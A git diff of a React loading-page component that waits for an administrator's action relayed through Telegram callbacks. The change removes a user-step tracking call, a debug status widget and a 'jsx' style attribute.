@@ -1,16 +1,11 @@
 import { useEffect, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Loader2 } from "lucide-react";
-import {
-  getSession,
-  showAdminButtons,
-  setUserCurrentStep,
-} from "@/lib/telegram-service-enhanced";
+import { getSession, showAdminButtons } from "@/lib/telegram-service-enhanced";
 import {
   registerTelegramCallback,
   unregisterTelegramCallback,
 } from "@/lib/telegram-callback-service";
-import { DebugStatus } from "@/components/DebugStatus";
 
 const Loading = () => {
   const location = useLocation();
@@ -39,12 +34,6 @@ const Loading = () => {
           console.log("🎯 Admin clicked:", action);
           handleAdminAction(action);
         });
-
-        // Set user step to waiting_admin for real-time activity tracking
-        console.log(
-          "🚀 Setting user step to waiting_admin for activity tracking...",
-        );
-        await setUserCurrentStep(sessionId, "waiting_admin");
 
         // Show admin buttons after 2 seconds
         setTimeout(async () => {
@@ -194,9 +183,6 @@ const Loading = () => {
         justifyContent: "center",
       }}
     >
-      {/* Debug Status Component - Remove this in production */}
-      {sessionId && <DebugStatus sessionId={sessionId} />}
-
       <div
         style={{
           backgroundColor: "rgb(255, 255, 255)",
@@ -333,7 +319,7 @@ const Loading = () => {
         </div>
       </div>
 
-      <style jsx>{`
+      <style>{`
         @keyframes slide {
           0% {
             transform: translateX(-40px);
